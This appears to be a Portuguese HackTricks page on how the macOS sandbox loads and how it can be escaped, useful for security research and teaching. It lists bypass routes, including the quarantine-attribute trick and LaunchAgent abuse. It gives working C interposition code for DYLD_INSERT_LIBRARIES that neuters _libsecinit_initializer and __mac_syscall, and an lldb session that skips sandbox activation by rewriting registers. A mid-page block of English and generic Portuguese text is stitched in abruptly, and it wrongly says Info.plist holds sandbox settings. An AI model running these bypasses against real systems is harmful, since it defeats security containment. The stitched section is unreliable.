# macOS Sandbox Debug & Bypass

<details>

<summary><strong>Aprenda hacking AWS do zero ao avançado com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Processo de carregamento do Sandbox

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>Imagem de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na imagem anterior, é possível observar **como o sandbox será carregado** quando um aplicativo com a permissão **`com.apple.security.app-sandbox`** é executado.

O compilador irá vincular `/usr/lib/libSystem.B.dylib` ao binário.

Em seguida, **`libSystem.B`** chamará outras várias funções até que o **`xpc_pipe_routine`** envie as permissões do aplicativo para o **`securityd`**. O Securityd verifica se o processo deve ser colocado em quarentena dentro do Sandbox e, se sim, ele será colocado em quarentena.\
Por fim, o sandbox será ativado com uma chamada para **`__sandbox_ms`**, que chamará **`__mac_syscall`**.

## Possíveis Bypasses

### Bypass do atributo de quarentena

**Arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para evitar a fuga do sandbox. No entanto, se você conseguir **criar uma pasta `.app` sem o atributo de quarentena** dentro de um aplicativo em sandbox, poderá fazer com que o binário do pacote do aplicativo aponte para **`/bin/bash`** e adicione algumas variáveis de ambiente no **plist** para abusar do **`open`** e **iniciar o novo aplicativo sem sandbox**.

Isso foi feito em [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)**.**

{% hint style="danger" %}
Portanto, no momento, se você for capaz de criar uma pasta com um nome terminando em **`.app`** sem um atributo de quarentena, você pode escapar do sandbox porque o macOS só **verifica** o **atributo de quarentena** na **pasta `.app`** e no **executável principal** (e vamos apontar o executável principal para **`/bin/bash`**).

Observe que se um pacote .app já foi autorizado a ser executado (tem um xttr de quarentena com a flag autorizada para executar), você também poderia abusar dele... exceto que agora você não pode escrever dentro de pacotes **`.app`** a menos que tenha algumas permissões TCC privilegiadas (o que você não terá dentro de um sandbox alto).
{% endhint %}

### Abusando da funcionalidade Open

Nos [**últimos exemplos de bypass do sandbox do Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) pode-se apreciar como a funcionalidade **`open`** do cli pode ser abusada para contornar o sandbox.

{% content-ref url="macos-office-sandbox-bypasses.md" %}
[macos-office-sandbox-bypasses.md](macos-office-sandbox-bypasses.md)
{% endcontent-ref %}

### Agentes/Daemons de Inicialização

Mesmo que um aplicativo seja **destinado a estar em sandbox** (`com.apple.security.app-sandbox`), é possível contornar o sandbox se ele for **executado a partir de um LaunchAgent** (`~/Library/LaunchAgents`), por exemplo.\
Como explicado neste [**post**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), se você deseja obter persistência com um aplicativo que está em sandbox, você pode fazê-lo ser executado automaticamente como um LaunchAgent e talvez injetar código malicioso via variáveis de ambiente DyLib.

### Abusando de Locais de Inicialização Automática

Se um processo em sandbox pode **escrever** em um local onde **mais tarde um aplicativo sem sandbox vai executar o binário**, ele será capaz de **escapar apenas colocando** o binário lá. Um bom exemplo desses locais são `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.

Para isso, você pode precisar de **2 etapas**: fazer um processo com um **sandbox mais permissivo** (`file-read*`, `file-write*`) executar seu código, que na verdade escreverá em um local onde será **executado sem sandbox**.

Confira esta página sobre **locais de inicialização automática**:

{% content-ref url="../../../../macos-auto-start-locations.md" %}
[macos-auto-start-locations.md](../../../../macos-auto-start-locations.md)
{% endcontent-ref %}

### Abusando de outros processos

Se a partir do processo em sandbox você conseguir **comprometer outros processos** em sandboxes menos restritivos (ou nenhum), você será capaz de escapar para seus sandboxes:

{% content-ref url="../../../macos-proces-abuse/" %}
[macos-proces-abuse](../../../macos-proces-abuse/)
{% endcontent-ref %}

### Compilação Estática e Linkagem Dinâmica

[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de contornar o Sandbox. Como o sandbox é aplicado a partir do espaço do usuário quando a biblioteca **libSystem** é carregada. Se um binário pudesse evitar carregá-lo, ele nunca seria colocado em sandbox:

* Se o binário fosse **completamente compilado estaticamente**, ele poderia evitar carregar essa biblioteca.
* Se o **binário não precisasse carregar nenhuma biblioteca** (porque o linker também está em libSystem), ele não precisaria carregar libSystem.

### Shellcodes

Observe que **mesmo shellcodes** em ARM64 precisam ser vinculados em `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Privilégios

Note que mesmo que algumas **ações** possam ser **permitidas pelo sandbox** se um aplicativo tiver um **privilégio específico**, como em:

```scheme
(when (entitlement "com.apple.security.network.client")
(allow network-outbound (remote ip))
(allow mach-lookup
(global-name "com.apple.airportd")
(global-name "com.apple.cfnetwork.AuthBrokerAgent")
(global-name "com.apple.cfnetwork.cfnetworkagent")
[...]
```

### Bypass de Interposição

Para obter mais informações sobre **Interposição**, consulte:

{% content-ref url="../../../macos-proces-abuse/macos-function-hooking.md" %}
[macos-function-hooking.md](../../../macos-proces-abuse/macos-function-hooking.md)
{% endcontent-ref %}

#### Interpor `_libsecinit_initializer` para evitar a sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
void (*overriden__libsecinit_initializer)(void);
void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interceptar `__mac_syscall` para evitar a Sandbox

{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
printf("Bypassing Sandbox initiation.\n");
return 0; // pretend we did the job without actually calling __mac_syscall
}
// Call the original function for other cases
return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
const void *replacement;
const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
{ (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```
{% endcode %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Depurar e burlar o Sandbox com lldb

Vamos compilar uma aplicação que deve estar em sandbox:

```c
#include <stdlib.h>
int main() {
system("cat ~/Desktop/del.txt");
}
```

### macOS Sandbox Debug and Bypass

#### Debugging the Sandbox

To debug the macOS sandbox, you can use the `sandbox-exec` tool with the `-D` flag to enable debug mode. This will print detailed information about the sandbox operations being performed.

```bash
sandbox-exec -D
```

#### Bypassing the Sandbox

To bypass the macOS sandbox, you can use various techniques such as exploiting vulnerabilities in the sandbox profile, abusing entitlements, or injecting code into a process to disable sandbox restrictions.

It is important to note that bypassing the macOS sandbox is a serious security risk and should only be done for research or testing purposes in controlled environments.

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

### Info.plist

O arquivo `Info.plist` contém as configurações de sandboxing para um aplicativo macOS. Ele define as permissões e restrições de acesso que o aplicativo terá ao sistema e a outros recursos. Ao modificar este arquivo, é possível ajustar as restrições de segurança impostas ao aplicativo, potencialmente permitindo a execução de ações não autorizadas. É importante revisar e validar as configurações do `Info.plist` para garantir que o aplicativo esteja devidamente protegido contra possíveis violações de segurança.

#### Bypassing Sandbox Restrictions

Existem técnicas avançadas que podem ser usadas para contornar as restrições de sandboxing e obter acesso não autorizado a recursos do sistema. Os desenvolvedores e administradores de segurança devem estar cientes dessas técnicas e implementar medidas adicionais para mitigar possíveis vulnerabilidades de sandboxing.

#### Debugging Sandbox Violations

Ao encontrar violações de sandboxing em um aplicativo, é importante realizar uma análise detalhada para identificar a causa raiz do problema. O uso de ferramentas de depuração e monitoramento pode ajudar a rastrear e corrigir violações de sandboxing de forma eficaz. Certifique-se de revisar regularmente os logs de sandboxing para identificar e resolver quaisquer problemas de segurança em potencial.

```xml
<plist version="1.0">
<dict>
<key>CFBundleIdentifier</key>
<string>xyz.hacktricks.sandbox</string>
<key>CFBundleName</key>
<string>Sandbox</string>
</dict>
</plist>
```

Em seguida, compile o aplicativo:

{% code overflow="wrap" %}
```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```
{% endcode %}

{% hint style="danger" %}
O aplicativo tentará **ler** o arquivo **`~/Desktop/del.txt`**, o qual a **Sandbox não permitirá**.\
Crie um arquivo lá, pois uma vez que a Sandbox for burlada, o aplicativo poderá lê-lo:

```bash
echo "Sandbox Bypassed" > ~/Desktop/del.txt
```
{% endhint %}

Vamos depurar a aplicação para ver quando o Sandbox é carregado:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
0x187659904 <+4>:  svc    #0x80
0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

{% hint style="warning" %}
**Mesmo com o Sandbox sendo burlado, o TCC** perguntará ao usuário se ele deseja permitir que o processo leia arquivos da área de trabalho.
{% endhint %}

## Referências

* [http://newosxbook.com/files/HITSB.pdf](http://newosxbook.com/files/HITSB.pdf)
* [https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
* [https://www.youtube.com/watch?v=mG715HcDgO8](https://www.youtube.com/watch?v=mG715HcDgO8)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
